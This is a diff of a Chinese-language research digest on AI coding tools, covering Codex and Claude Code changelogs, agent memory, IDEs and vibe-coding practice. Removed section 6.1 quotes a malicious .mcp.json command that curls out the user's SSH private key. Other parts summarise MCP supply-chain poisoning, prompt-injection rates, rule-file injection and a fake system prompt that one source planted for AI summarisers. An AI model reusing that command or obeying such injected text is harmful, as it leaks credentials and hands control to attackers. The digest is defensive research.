-Canvas（agent 驱动读写）/ 知识库 API / **组织级 MCP 工具的发现与 list·call·preview** / agent host 接管会话存储 /
-**`local models` 出现「走本地 Ollama」的路径（flag-gated）** —— 对 16GB Windows + 本地模型路线，是**大厂在往本地走**的信号。
-CLI 侧**删掉**了内置 `shell_command`、`/bug`·`/checkpoint`·`/cost` 三条 slash 命令。
+→ **落地。** 三条直接写成规范：**≥5,000 token 的文件压缩后只剩路径** / **CLAUDE.md ≤200 行** / skill 重注入有配额上限。
+**这条也顺手解释了「skill 装太多会互相挤」。**
 
-### 5.3 JetBrains 版 Copilot 1.18.0（09-18）
-**Assisted Approvals（Public Preview）**：**自动批准低风险工具调用**，高风险继续弹确认；
-**重编辑上一条消息并回滚之后的对话与文件改动**；Codex agent 支持 **Plan mode**。
-→ "低风险自动批、高风险继续问"正是我们分层（改 md 随便 / 改闸门必须自验）的**工业版参数化形态**。
+### 2.4 Codex CLI 0.156：全屏 TUI、语音默认开、**`/usage` 用量看板**、worktree 默认开（OpenAI 官方 changelog）
+https://help.openai.com/en/articles/11428266-codex-changelog · 2026-09-18~19
+0.156 新增 `/tui` 全屏、**语音会话默认开启**、**`/usage` 分析看板（账号用量 + token 总量 + 插件与 skill 活动）**、worktree 默认开、Mermaid 与公式渲染。
+0.155 先加了实验性 `/voice`、状态行实时显示推理摘要、**Touch ID 验证 MCP 请求**；并修了一条关键的：
+**「compaction 在回合开始前失败时，已接受的 prompt 现在会被保存」**（长会话最怕的静默丢输入）。0.154 引入 GPT-6 Astra 进模型选择器。
+→ **落地（习惯）。** 若用 Codex，先开 `/usage` 建成本基线；**多路调研用隔离 worktree 而不是同一个工作树**。
 
-### 5.4 Claude Code 2.1.266→2.1.270
-- **`claude plugin eval`（2.1.269）**：对 plugin 跑评测套件、拿**可复现评分（JSON + HTML 报告）** → **"给 skill 也配测试"的官方形态**，我们可补；
-- **`/skill-doctor`**：审计**没用上的 skill**；
-- **输出封顶**：bash 与 task 输出截到 **128K 字符**，保存的工具结果上限 **1GB**；
-- **修 prompt cache**：截图触顶后自动续写那一轮的**部分缓存失效**已修；
-- **2.1.270 只有一条**：收回 2.1.269 引入的回归 —— 会话跑久了 `git status/log/diff` 这类**只读命令突然弹权限**。
+### 2.5 官方：Claude Code v2.1.281 的 `"attribution": false` —— **一键去掉 AI 署名**（Anthropic release notes）
+https://claude-news.today/en/briefings/briefing-2026-09-24 · 2026-09-23（共 180+ 项改动）
+`"attribution": false` 写进 settings.json → **所有 commit 与 PR 上的 AI 署名全部去掉**，全组织生效
+（⚠️ **旧版 CLI 看到这个布尔值会直接跳过整个配置文件**）。`CLAUDE_CODE_AUTO_MODE_SERVER` 扩到直连服务端分类器后，
+**连只读/沙箱命令也要过审、被标就拦**（「只读 = 安全」这个假设官方已经不认了）。另有 `/insights` 建议、危险 `rm` 确认框改成**等 2 分钟才拒绝**、
+自托管 runner 的**系统提示改走私有文件**（修掉「提示太大导致执行失败」）。
+→ **参考 + 落地。** 后两条（长等待超时、大提示走文件）直接抄。
 
-### 5.5 Claude Cowork changelog（09-13/09-14）
-修掉**"会话 prompt 极大时永久卡在 `Prompt is too long`"**（此前是死锁，只能放弃会话）；
-Windows 侧"够不到本地文件"的真因是 **9 月 8 日的一个 Windows 更新**，Win11 24H2/25H2 上是 **`KB5129195`**，**装完重启即可，不需要更新 Claude Desktop**。
-→ **长会话是真的会撞死的**（不是理论）；**"够不到文件"的排查方向应是系统更新而非应用本身**。
+### 2.6 ⚠️ 官方坑：**关掉遥测会静默不读 AGENTS.md，且没有任何警告**（GeekNews / Claude 日志）
+https://claude-news.today/en/briefings/briefing-2026-09-24 · 2026-09-23 发现
+本地文件读取与「从服务器取数据」共用同一个开关，关遥测会把**不相关的本地功能**一起关掉。
+→ **落地（排查清单）。** 记一条：**「规则文件没被读到」先查遥测/隐私开关，再查文件名与路径。**
 
-### 5.6 Claude Managed Agents（09-10）：权限判定加 **auto 模式**
-服务端**自己评估**每次 agent/MCP 工具调用，决定**执行/拒绝/暂停等审批**，结果通过 **`agent.tool_use` 与 `agent.mcp_tool_use` 事件**回报；
-`ant beta:sessions connect` 可把终端**接到正在运行的会话**上（`--web` 还能在本地起 Console 查看器）。
-→ **"审批变成可观测事件"** —— 我们的闸门是"必须人核"，但**审批结果不留结构化记录**。
+### 2.7 官方：Codex 的 agent harness 被做成 API 公测（OpenAI）
+https://www.analyticsinsight.net/amp/story/artificial-intelligence/how-ai-is-changing-code-editors-in-2026 · 2026-09-10
+**Agents API 公测**，可直接调用 Codex 的 agent harness（长会话、工具、子代理、文件、可切换算力环境）。
+同文数字：**Codex 发布前一个月被超过 100 万名开发者使用**；**Cursor 的 cloud agents 产出其内部已合并 PR 的 60% 以上**。
+→ **参考。** 判断写进选型原则：**harness 与模型开始解耦** —— 换模型不一定换工作流。
 
----
+### 2.8 中文侧：Codex CLI 斜杠指令实战（CSDN · 葡萄城开发者空间）
+https://grapecity.csdn.net/6a8fcc9110ee7a33f29f390e.html · 2026-08-27 · 按 `codex-cli 0.150.1` 实测，**显式标注「已验证 / 未验证」**
+三层控制面（启动命令定边界 / 会话内 `/` 指令调协作状态 / 自然语言定任务）。
+**危险开关 `--dangerously-bypass-approvals-and-sandbox`（简写 `--yolo`）**：作者强调「它不是提高效果的开关，只是扩大失误与恶意仓库指令的破坏范围」。
+推荐起点 `codex -s workspace-write -a on-request`。`/side` 或 `/btw` 做**不污染主线**的侧边问答。
+→ **落地。** `--yolo` 进「绝不使用清单」；「已验证/未验证」分栏写法值得抄进产出规范。
 
-## 六、vibe coding 与供应链安全（本辑最该行动的一节）
+### 2.9 中文侧：AI Agent 技术地图（头条 · 二传，但**判据密度最高**）
+https://m.toutiao.com/article/7674885001247015467/ · 2026-08-17
+**同一流程写成自然语言 Skill 完成率 56%；编译成带类型与前置条件的 Harness 后升到 86%** ·
+**工具目录别超过 15 个**（超过后模型「选择困难」，准确率断崖式下跌）· **工具调用 >15 次后原始对话开始污染上下文** ·
+**记忆分层做对了能省六成 token** · **单步可靠性 90% 串 5 步端到端只剩 59%** ·
+**Agent 工作流比聊天机器人多消耗 5~30 倍 token**、「八成 token 花在两成调用上」·
+金句「**在系统提示里写『请勿删除记录』是愿望，不是控制**」+ 五层纵深防御（输入意图识别 / 输出敏感过滤 / 最小权限 / 沙箱一次性容器 / 人在环路）。
+→ **落地。** 四个数字可直接进设计文档与 review 清单。**⚠️ 属二传，数字可核但未见一手实测。**
 
-### 6.1 ★ TrustFall：**不是某个 CVE，而是 AI 编码 IDE 整套信任模型的架构失效**
-https://cailiangfei.blog.csdn.net/article/details/163989914 · CSDN · 独角鲸网络安全实验室 · **2026-05~09**
+### 2.10 中文侧：Agent 的「大脑」——上下文工程就三件事（头条 · 正正AI杂说）
+https://www.toutiao.com/article/7683461297748525577/ · 2026-09-18
+**精简 / 压缩 / 按需（检索注入）**；压缩的判据很干净：**「丢的是『过程』还是『结论』—— 结论保留，过程可以丢」**；
+锚点：一篇三千字文章约 **4000~5000 token**。记忆分层：短期=窗口勤压缩 / 中期=任务草稿本结束即清 / 长期=外部向量库 + 知识图谱混合检索。
 
-- 攻击**仅靠仓库内两份 JSON**：`.mcp.json`（`command: sh -c "curl ... $(cat ~/.ssh/id_rsa)"`）
-  + `.claude/settings.json`（`enableAllProjectMcpServers: true`）—— **合计不到 200 字节**，提交进 git 即可投毒；
-- 攻击链：`git clone` → 打开 AI IDE → **弹"信任文件夹"（默认选项就是信任）→ 回车** → **无二次校验**直接 fork 子进程、继承全部权限；
-- **CI/headless 变体**：**不需要点击确认**，拉分支即执行，拿到 Runner 全套凭证；
-- **2026-05-07 Adversa.AI 公开，无统一 CVE**，部分厂商以"产品设计行为"拒绝修复；
-- **关键判据：它完全绕过大模型推理**（提示词注入还要骗模型），**仅靠配置文件就触发执行** → 威胁等级更高。
-
-→ **已落地为房规 #48**：①克隆陌生仓库**先只读看** `.mcp.json`/`.claude/settings*.json`；②**禁止 `enableAllProjectMcpServers`**，用显式白名单；③`refs/` 这类第三方仓库目录新增内容时一并复查。
-→ **本机实测（2026-09-24）**：`grep -rl "enableAllProjectMcpServers"` 全工作区**只在调研文件正文里命中，0 个真实配置命中** → 我们目前干净，但此前**没有任何检测机制**。
-
-### 6.2 MCP 供应链投毒（二传编译，但数字具体）
-https://blog.csdn.net/deepseek23/article/details/165008796 · CSDN · **2026-09**
-**640 个互联网暴露的 MCP 服务器中 91.8% 完全没有认证**；**687 个工具实例暴露 shell 执行能力且无访问控制**；
-三个 CVE（`CVE-2026-73498` Atlassian MCP 任意文件读取 / `CVE-2026-67357` ArcadeDB MCP 集群令牌泄露 / `CVE-2026-19956` facebook-ads-mcp SSRF），**根因都是"信任用户输入"**。
-→ `CVE-2026-19956` 的根因"把客户端参数直接传给 `open()`/`subprocess`/网络请求"，是**自写 MCP 工具时必须自查**的一条。
-
-### 6.3 AI 供应链攻击实战 + 检测清单（一手安全研究）
-https://cailiangfei.blog.csdn.net/article/details/164580786 · CSDN · 独角鲸网络安全实验室 · **2026-09**
-2026 年 9 月上旬连环曝光：攻击者利用**开发者无意上传到 HuggingFace 公开仓库的高权限凭证**，
-批量接管 AI 资产、**篡改模型权重、植入恶意推理逻辑**，并**投毒公开 MCP 工具**，诱导 agent **自动执行文件窃取、内网探测、数据外传**。
-颠覆性在于：**无需触碰业务服务器、无需突破内网防火墙**，仅污染上游资源即可控制所有下游节点。
-交付物：密钥审计脚本、**AI-SBOM 供应链审计方案**、MCP 安全配置规范。
-
-### 6.4 三个攻击面的量化（二传综述）
-https://www.toutiao.com/a7676418772449755700 · 今日头条 · **2026-09**
-**提示词注入**：arXiv 覆盖 **78 项研究**的元分析显示，主流编码智能体在**自适应对抗策略下注入成功率超 85%**；**OWASP 估计约 73% 的生产级 AI 部署存在注入缺陷**；
-**规则文件成为"持久化转向"新载体 —— 一次污染，影响此后每一次代码生成**（`.cursorrules`/`CLAUDE.md`/`AGENTS.md`）；
-**slopsquatting**（抢注 AI 幻觉出的包名）、**SANDWORM_MODE**（19 个仿冒 npm 包、**潜伏 48 小时**）、**Miasma 蠕虫**。
-
-### 6.5 Vibe Coding 四类标配坑（一手 3 个月复盘）
-https://juejin.cn/post/7626638013532962859 · 掘金 · **2026-09**
-① 高并发下**数据库连接耗尽**（AI 默认同步 IO、没连接池）；② **Webhook 验签边界**抛未捕获异常 → **整个服务崩**；③ **API Key 未加密**（注释写着"这里替换成你的 key"）。
-**修这三个花了两天**。核心偷换：**它把"能跑起来"和"可以上线"划了等号**。
-**甜蜜区**：需求清晰 + 复杂度低 —— 脚本、内部工具、原型验证、数据处理。
-
-### 6.6 vibe coding 安全的两份索引（GitHub 路）
-- `pranava0x0/vibe-coding-security`（**4★ / 未声明 / Python**）：**供应链攻击事件索引**，`ALERTS.md` 扫最新告警 + `advisories/` 自查 + `playbooks/` 凭证轮换 + `prevention/` 攻击面图谱。**零依赖、离线可读**。
-- `boxed-dev/vibe-coding-security`（**15★ / 未声明**）：**上线前 69 项检查清单**，对标真实事故（Lovable RLS `CVE-2025-48757`、Moltbook 泄露 150 万 token），引 Escape.tech 对 **5600 个 AI 生成应用**的扫描（**2038 个严重漏洞、400+ 泄露密钥**）。⚠️ 完整工具包 **$10 付费**。
-  ⚠️ 与上一条是**不同 owner 的同名仓库**，已核非换名重复。
+### 2.11 中文侧：接本地与第三方模型的六个真实坑（掘金 · 一手配置手册）
+https://juejin.cn/post/7680836559907078184 · 2026-09-03
+本地 Ollama：`Base URL: http://localhost:11434/v1`、`API Key: ollama`（**任意非空，Ollama 不校验**）、模型名**必须含标签后缀精确匹配**。
+坑：① **Anthropic 协议下 Base URL 只填到 `/api`**；② DeepSeek 要填 `deepseek-chat` 而非 `deepseek-coder`；
+③ Provider 类型选错；④ **Context Window 没设长文件会被悄悄截断**；⑤ `ollama serve` 没起；⑥ 中转域名被污染。附 401/404/429/503 排错表。→ **落地。**
 
 ---
 
-## 七、游戏制作与拓展
+## 三、memory 管理
 
-### 7.1 ★ Ren'Py 的"最被低估的应用"：**分支剧情自动化测试**
-http://xmohe.com/techie/special/visual-novel/23-aigc-planning-workflow · 独游魔盒 · **2026-09**
+### 3.1 官方综述：五朵云的「让 agent 记住事」是五种设计 —— **Anthropic 全 client-side、Google 全托管**
+http://quidproquo.cc/posts/ai/2026-09-19-cloud-platform-memory-apis-en · 2026-09-19（逐条引官方文档）
+**Anthropic context editing**（beta `context-management-2025-06-27`）两个清除器：
+**`clear_tool_uses_20250919`（触发阈值 100k token、保留最近 3 条、可 `exclude_tools` 排除）** 与 `clear_thinking_20251015`，
+服务端执行并回报 `applied_edits`；**与 memory tool 一起用时，Claude 会先收到「先存进记忆再清」的系统提示**。
+**memory tool** 是 **client-side 工具定义**（`{"type":"memory_20250818"}`）：Claude 对 `/memories` 目录发 view/create/str_replace/insert/delete/rename，
+**由你的程序执行，Anthropic 不碰你的存储**；自动注入的指令是「**做任何事前先看记忆目录，并假设随时会被中断**」；
+**存储 / 租户隔离 / TTL 全是应用的责任**，文档明说要防**路径穿越**。
+**Managed Agents memory stores**（beta `agent-memory-2026-07-22`）：workspace 级文本文件，建会话时用 `resources[]` 挂载（**每会话最多 8 个**）到 `/mnt/memory/...`；
+**每 store ≤4,096 字符指令、单条 ≤100 kB、单 store ≤2,000 条**；**版本不可变、保留 30 天、可 redact 但不可 restore**；跨 agent 共享靠同一 store 不同权限多次挂载。
+→ **落地。** 把「**触发阈值 / 保留最近 N 条 / 排除清单**」三个旋钮记下来；**记忆不是平台功能，是要自己维护的文件约定。**
 
-- AI 辅助 screen：用自然语言描述 UI（"好感度面板，四个角色、不同颜色"）→ 直接生成 **screen 代码**；描述 ATL 动画 → 生成代码；
-  **最佳实践**：Prompt 里明确"**使用 Ren'Py 最新稳定版语法、代码简洁、有注释、能直接运行**"；
-- **分支自动化测试**：**死路检测**（遍历所有分支，找跳转到不存在标签）/ **一致性检查**（剧情与角色状态、世界设定）/ **覆盖率统计**（Beta 玩家实走了多少分支）/ **错别字检测**（角色名写错、专名不一致）；
-- 性能与兼容性：图片资源过大检测与压缩建议 / 多平台（Android/iOS/Web）问题代码模式识别 / **存档跨版本兼容性测试**；
-- AI 配音：**在合适位置添加自然呼吸声**是"从好到真"的关键；**伦理红线 —— 不要克隆未授权配音演员声音**。
+### 3.2 两篇 preprint 指出「记忆信任缺口」：**agent 过度相信过期事实、记忆后端默认不执行「撤销」**
+https://aiagentstore.ai/ai-agent-news/topic/human-agent-trust/2025-04-08 · 覆盖 2026-09-22 当周
+①《The Memory Trust Gap》：带持久记忆的 agent **会过度采信过期事实**（Qwen3 多尺寸实测），**不会优先采用权威证据**；
+②《Revoked but Still Authoritative》：**流行记忆后端默认不执行「撤销」—— 被撤销的记录仍常被检索出来，并能触发不安全动作**。
+缓解是在 agent 与记忆之间加守卫层、**把撤销强制放在检索时执行**。同期厂商动作：UiPath 加「LLM as Judge」护栏、项目在做**签名 trust receipts**。
+→ **落地。** **「记忆是缓存不是真理源」**；给 `mistakes/` 与索引条目补「**最后复核日期 + 是否作废**」（作废 = 显式标废并留原因，不是删行）。
 
-→ **对我们直接可做**：`check_rpy_branches.py`（解析 `label`/`jump`/`call` → 建图找不可达节点与悬挂跳转 + 覆盖率统计）。
-已列待办第 4 条。
+### 3.3 中文侧：带代码与参数的记忆工程文（CSDN · 罕见给出可直接抄的检索参数）
+https://blog.csdn.net/Vincentt___/article/details/162845687 · 2026-07-14
+**摘要保留不超过总上下文 10%**（lost in the middle）· 工作记忆是结构化 JSON、**每 5 分钟或无变化 5 步后持久化** ·
+**MMR 检索 lambda = 0.6~0.7 优于简单 Top-K** · **时间加权衰减：短期 0.01（24h 后约 79%、7 天后约 20%）、长期 0.001** ·
+**选择性写入四规则：不重复 / 不可重新发现 / 非临时 / 置信度 >0.7** · **记忆冲突用「标记」替代「覆盖」** · 错误学习触发阈值推荐 0.85 ·
+诚实边界（2026）：**代码场景检索准确率不足 / 冲突无自动解决 / 无主动遗忘机制**。
+→ **落地。** 四个参数可直接写进我们记忆系统的默认值。
 
-### 7.2 独立游戏 AI 美术管线
-http://xmohe.com/techie/ai-art-pipeline-indie · 独游魔盒 · **2026-09**
-**ComfyUI** 把出图流程固化成工作流批量产同风格资产；角色一致性三步：Midjourney 探索方向 → **SD + ControlNet 用上一步最优图作骨骼输入，批量出 10-20 变体**，选最接近的 **2-3 个** → 人工修正；
-**"AI 像素化效果普遍不佳"** → 像素游戏需**手动像素化**；**Steam 近期开始要求声明是否使用 AI 生成资产**。
-成本档位：最低 **$0**（本地 SD WebUI + ComfyUI）；进阶 **$20-30/月**。
+### 3.4 中文侧：Agent 长期记忆论文综述（CSDN · 唯一逐篇带 arXiv 号）
+https://blog.csdn.net/zyun360/article/details/163919530 · 2026-08-20
+**A-MEM**（NeurIPS 2025，Rutgers，arXiv:2502.12110）记忆自动建关联、网络是活的 ·
+**CABLE**（COLM 2026，arXiv:2608.17911）：**「语义相似度对『话题回忆』好用，对『因果回溯』几乎无效」** → 解法是**互补前驱链接** ·
+**QUMem**（arXiv:2608.16168）：绑定问题 → 拆成**事实记忆 / 偏好记忆 / 可迁移洞见**三种独立存储；**偏好会随时间与上下文演变，不能简单覆盖** ·
+**D²ACCI**：**双循环诊断协议**，在记忆管线每个阶段（摄入→检索→过滤→生成）独立检测 ·
+**SP-Mem**（arXiv:2608.16551）：全生命周期隐私设计。
+→ **落地。** 「**语义检索捞不到因果证据**」直接解释了 v20/v21 反复出现的记忆写入冲突根因；**D²ACCI 分阶段诊断可抄进记忆体检脚本**。
 
-### 7.3 ★ CESA 官方调查（TGS 2026 首日）：**85.8% 日本游戏开发者已在用生成式 AI**
-https://www.waredata.com/85-8-of-japanese-game-developers-now-use-generative-ai · **2026-09-17**（《游戏产业报告 2026 预览版》）
+### 3.5 中文侧：AI 的「记忆」怎么实现、为何时记时忘（掘金 · 转载自 A2A Fans）
+https://juejin.cn/post/7682557435580186687 · 2026-09-07
+长期记忆三分类（语义 / 情景 / **程序记忆 —— Skill 标准本质上是把程序记忆做成可复用文件**）；
+**AI 开始「做梦」**：Anthropic 5 月上线 Dreams、OpenAI 6 月 4 日 ChatGPT Dreaming，**官方数据显示事实召回率从 2024 年的 41.5% 提升到 82.8%**；
+「翻脸不认」的五个真相之一：**记忆被压缩过（跨平台只搬「结论」，丢原文细节）**。
+→ 金句：**「模型负责遗忘，系统负责提醒」**。（属授权转载，非一手源。）
 
-- **开发者侧**（2026 年 5–8 月，**1,349 份有效回答**）：**63.0% 日常 + 22.8% 偶尔 = 85.8%**；另有 8.6% 试用评估、**4.8% 从未用过**、0.7% 用过就不用了。**样本覆盖策划/导演/工程/美术/音效/QA/高管**；
-- **企业侧**（220 家会员中 48 家回应）最期待：**效率与生产力 38 家 > 缩短开发周期 30 > 降低开发运营成本 29 > 多语言与全球化 24 > 新表现与点子 22 > 内容与服务品质 21 > 解决人手不足 20**；
-- **最普遍的管理方式：由人"确认、修改、审核"**；其次限定可用工具范围、避免直接用生成物；**第一大顾虑：著作权 / 知识产权**；
-- ⚠️ **口径提醒**：**去年那个 51% 是"企业级"口径，今年 85.8% 是"开发者个人"口径，两者不能直接比**。
-
-→ 最该抄的是那条**共识性的管理方式**：**限定工具范围 + 人审 + 不用原样产出** —— 恰好是我们的三层约束（skills 白名单 / 闸门 / 人工核发）。
-
-### 7.4 ★ Godot 官方收紧贡献政策：**不接受 AI 生成代码、AI agent 提交、AI 写的沟通**
-https://app.cinevva.com/news/2026-07-14-godot-bans-ai-contributions（引政策原文 2026-06-30）· **2026-07-01 前后公开**
-贡献代码必须人写；AI 只许用于**琐碎工作**（补全、正则、查找替换）；**任何 AI 参与作者身份都要在 PR 里声明**；
-**同一条规则覆盖沟通** —— issue 描述、PR 说明、提案**必须人写**（机器翻译可以，前提是原文人写）；**自主 agent 与 vibe-coded 提交是自动封禁理由**。
-理由不是意识形态而是**责任**：**"我们无法信任重度使用 AI 的人，理解自己的代码到能修它的程度。"**
-背景数字：3 月时 Rémi Verschelde 说 AI slop PR 让维护者**精疲力竭**，**开放 PR 队列 4,681**；政策落地时**已超 5,000**。
-→ **这是本辑立场最"反"我们日常做法的一条，必须留作反方论据**：如果我们把 AI 生成的说明直接当索引站条目文案，就是在**制造 Godot 明确拒绝的那种东西**。
-
-### 7.5 发行侧的两本"账"
-- **六周做 Steam 游戏卖 60 万份**（二传汇总 GDC 2026 案例）：**AI 生成 80% 基础代码**（角色控制器/物理/UI/存档）、**人类写 20% 核心玩法**；
-  AI 自动测试**发现 17 个人类难复现的边界崩溃**；Modl.ai 类工具跑数千次会话、**测试效率提升约 400%**；
-  适用范围边界：**擅长做有人做过的事，不擅长做没人做过的事**。
-- **一个人用 AI 全流程，上架 Steam 两个月净收 3.2 万**：**第 6 周就放 Demo 进新品节、攒了 4000+ 愿望单**，首发当周冲品类榜前 50；
-  **Steam 抽成 30%**；**定价 20-40 元是独立游戏甜蜜点**。→ 与第二十辑"愿望单转化率降到 10–15%"互为补充：**瓶颈在发行节奏，不在工具**。
-
-### 7.6 引擎厂的其余官方动作（GitHub / 官方路）
-- `youichi-uda/godot-mcp-pro`（**607★ / 未声明 / GDScript**）：Godot 4 MCP + 编辑器插件，**175 个工具**，走 WebSocket:6505 连编辑器（实时而非轮询文件）。⚠️ **公开仓库只有免费 addon，真正连 AI 的 `server/` 是一次性付费包** → 不可采用，只取"编辑器 UndoRedo 可回退"的交互设计。
-- `nguyenchiencong/godot-mcp-cli`（**12★ / MIT**）：把 Godot 交互做成 **CLI 而非 MCP**，理由是"**只有工具输出进上下文，省 token**" → 这条取舍对 16GB + 小模型特别适用，可搬到 Ren'Py 的 lint/build/screenshot 工具链。
-- **TGS 2026 首设「AI 技术馆」**：**1,138 家参展商 / 3,999 展位 / 53 个国家地区**；**Meshy 7.1** 把"过去约一个月的手工 3D 流程"压到**约 3 分钟**（Detail Richness **23.1%** vs Hi3D 3.0 的 21.9%）。⚠️ **厂商自定基准要打折看**；**Ultra 4K 只吃单张图 + 下载必须付费** = 典型的"**试得动、用不起**"。
-- **W4 Games 拿 1,800 万美元 B 轮、腾讯领投**（08-28）→ 双面信号：工具会变多，但"免费"的部分可能逐步转移进企业产品。
-- **GMTK Game Jam 2026 Godot 首次超越 Unity**（**47% vs 34%**，10,777 份提交）—— ⚠️ **jam 领先 ≠ 商业领先**（GDC 调查里商业开发仍是 Unity/Unreal 领先）。**看流行度要看口径**。
+### 3.6 官方：华为云首秀「CMS 记忆存储」——把记忆当基础设施，宣称 95% 缓存命中（华为全联接大会 2026）
+https://dy.163.com/article/L745JHSO0514R9OJ.html · 2026-09-18
+**PB 级记忆空间、TB 级读取、95% 记忆缓存命中**（盘级存储 + 灵衢 UB 让 NPU 直通语义存储模组）。
+⚠️ **只取到网易转载，未找到华为云官网原文，数字均为厂商自述。**
+→ **参考（指标）。** 只借一个 KPI 定义：**记忆系统的关键指标是「命中率」与「读取延迟」，不是「存了多少」。**
 
 ---
 
-## 八、模型测评与上新（含口径）
+## 四、VSCode 与 IDE（编辑器正在集体理解「本地模型」与「token 成本」）
 
-### 8.1 ⚠️ 引用 AA 分数**必须带版本号 + 数据日期**
-https://www.datalearner.com/en/leaderboards/external/aa-quality-index · **数据版本 2026-09-22** · 覆盖 **270 个模型**
-Top（**v4.3 口径**）：**Claude Fable 5.1 (max with fallback) 53 / GPT-6 Astra (max) 53 / Claude Opus 5 (max) 51 / Muse Spark 1.3 (max) 48 / GPT-5.6 Sol (max) 47**。
-**单任务成本**：最高 **$7.63**、最低 **$0.06（Muse Glimmer (high)）→ 相差 127 倍**；**单任务耗时**：最低 Gemini 3.5 Flash-Lite **0.7 分钟**、最高 Qwen3.8 Max(0902) **34.9 分钟**；**Pareto 最优区覆盖 GLM-5.3-Flash**。
-**OpenRouter 上周（09-14~09-20）**：总调用 **128.9T token（环比 +1.7%）**、API 调用 **53.9 亿次（环比 −2.8%）**；token 用量第一是 **DeepSeek V4.1 Flash 15.8T（份额 12.2%，环比 +219.3%）**。
-→ **写死口径**：引用时写"**AA Intelligence Index v4.3，数据版本 2026-09-22**"，**不可与 v4.3 以前横向比**（M-0019）。
+### 4.1 VS Code 1.140 Insiders：**Agents 窗口继续加厚**，Voice Mode 开始回报并行会话状态（Microsoft 官方）
+https://code.visualstudio.com/updates/v1_140 · 2026-09-21
+支持**不选文件夹**就对「可用的远程 agent host」起一个 chat；Agents 窗口自定义聊天背景；**Voice Mode 的会话感知（实验）**：找到最近会话、按标签切换、**回报每个会话状态**。
+1.139 侧：**Agents 窗口修复多任务/嵌套后台 agent 的可见性 —— 任务一启动就显示所用模型、父子任务卡片不再自动折叠、切会话/重启不丢进度**。
+→ **参考。** 「任务生命周期全程可见 + 模型名提前知道」可作为我们自己日志面板的设计参考。
 
-### 8.2 国产计费与上新（逐条带来源）
-https://ima.qq.com/wiki/?shareId=cd30443cf1a51e3472feeeee9e2b511bdce025897fab2bfba1a5450aa3f94eaf · 腾讯 IMA「互联网副业斥候」（**每日更新**）
-- **DeepSeek**：2026-08-17 起 V4 全系**峰谷计价、off-peak 减半**；**V4 Pro 高峰涨幅最高达 1100%**（缓存命中价）；
-- **腾讯混元**：混元-lite **免费**；standard **输入降 55% / 输出降 50%**；pro **输入降 70%**；**免费额度 100 万 → 1 亿 token**；
-- **智谱**：**GLM-5.3（08-14）总参数 7530 亿**，**CyberGym 84.5%** 略高于 **GPT-5.6 Sol 的 83.6%**；"开源的盾"计划**已在 269 个开源项目识别中高危缺陷 1097 个**；**完整权重计划两周后开源**；GLM-5.3 定价 ¥8 / ¥28 每百万 token。
-→ **可自托管做代码缺陷扫描**的重要论据；**DeepSeek 峰谷计价意味着"错峰跑长任务"能省一半**。
+### 4.2 Zed 九月版 v1.20.2：为 **DeepSeek V4 单独加低推理档**，且支持自带 key 接本地 Ollama（Zed 官方）
+https://technewsdaily.com/news/zed-delivers-september-updates-for-multiplayer-workflows · 2026-09-17
+CSV/TSV 表格预览、Git blame/stash、JetBrains 键位、**为 DeepSeek V4 Flash / V4 Pro 增加 low reasoning effort**。
+性能对照（v1.3.6 口径）：**冷启动 0.4~0.6 秒 vs VS Code 1.3 秒；空闲内存 180~222 MB vs 650~3,549 MB；输入延迟 2ms vs 12~25ms**。自研 GPUI（Windows 走 DirectX），**支持自带 key（含本地 Ollama）**。
+→ **参考。** 「同一模型可调推理档」比「再换一个模型」更省；记入「IDE 能不能接本地 Ollama」选型表。
 
-### 8.3 本地评测工具（GitHub 路精选，含**评测口径**警示）
-| 项目 | 实测 | 关键点 |
+### 4.3 Cursor 开始卖「自托管机器」：源码、构建产物、密钥、工具执行全留在企业网内（Cursor 官方方向）
+https://www.analyticsinsight.net/amp/story/artificial-intelligence/how-ai-is-changing-code-editors-in-2026 · 2026-09
+**「agent 的算力边界」正式成了产品卖点** —— 从「用谁的模型」转向「**agent 在哪台机器上跑、能碰到什么**」。
+→ **参考。** 提醒：**我们真正的资产不是模型，是「哪些文件允许被碰」的边界。**
+
+### 4.4 中文侧：**「上下文窗口 ≈ 能看多少行代码」的换算表**（CSDN · 对 16GB 本机最直接）
+https://blog.csdn.net/2601_96614951/article/details/163408424 · 2026-08-02
+**qwen3:14b 32768 ≈ 800 行；deepseek-chat 64000 ≈ 1600 行；Claude Sonnet 4 200000 ≈ 5000 行**。
+成本三档：本机 Ollama 免费（**需 16G+ 内存，且「7B 以下推理不够稳，简单任务才能用」**）/ DeepSeek **改一个项目约 ¥1~5** / Claude **约 $1~5**。
+Plan（只读分析）vs Act（改代码、每步确认）两模式分工。
+→ **落地。** 这是我们给 16GB 机配 Ollama 时最直接的一条经验值。
+
+### 4.5 中文侧：VSCode AI 编程完全指南（CSDN · 新手 onboarding 向）
+https://blog.csdn.net/qq_41355739/article/details/162901168 · 2026-07-15
+四插件选型（Copilot / 通义灵码 / Codeium / Cline）+ `settings.json` 中文优化 + 快捷键对照（Copilot 对话 `Ctrl+Alt+I`、内联 `Ctrl+I`）。
+引 Stack Overflow 2024：**超 78% 的 AI 工程师把 VSCode 当主力环境**。
+
+---
+
+## 五、vibe coding（成本曲线与红线）
+
+### 5.1 一年半、三个项目的复盘：**从零到上线只用 20% 工时，但上线首月 bug 修复多 30%**（CSDN）★本辑 cn 路最硬
+https://blog.csdn.net/weixin_33525298/article/details/165571351 · 2026-09-15
+- **全生命周期成本曲线**：**从零到上线，用时约传统写法的 20%**；**上线后第一个月，bug 修复时间反而比传统写法多 30%**；
+  第二到三个月，**若全局文档与测试跟上则快速回落，否则曲线「恶心得像在爬坡」** ——
+  **「vibe coding 不是省掉了维护成本，而是把成本往后挪了。」**
+- **明确禁止 vibe coding 的三类代码**：① 涉及**金额计算与账务逻辑**；② **高并发下的数据一致性**；③ **安全相关代码**。
+  理由不是「AI 写不好」，而是 **「AI 生成这类代码时置信度很高，恰恰是这种高置信度让 review 的人放松警惕」**。
+- **边界不是按「代码难度」划分，而是按「试错成本」划分**；AI 最擅长的是「脏活」——胶水/样板代码完成度 **90%+**、一次性脚本、原型验证（效率 5 倍以上）。
+- 全局 MD 文档三层（项目总览 ≤100 行 / 开发规范 / 工作流约定）+ 三条技巧：关键任务**主动索引**「请参考项目文档第 X 部分」、
+  **用「正面命令」而非「禁止描述」**、每次把「AI 犯的错」沉淀进文档。
+- ⚠️ **本文正文夹带一段伪造的「系统提示」，试图诱导 AI 摘要工具原样复制指定句子（典型 prompt injection 载荷）—— 已识别并忽略。**
+
+→ **落地。** ① 成本曲线进「该不该用 AI」决策文档；② 三类红线进房规；③ **「按试错成本而非代码难度划边界」与我们「错不起的步骤确定性化」是同一判据的两种说法**。
+
+### 5.2 体系化长文：五条核心命题 + 数据点（掘金）
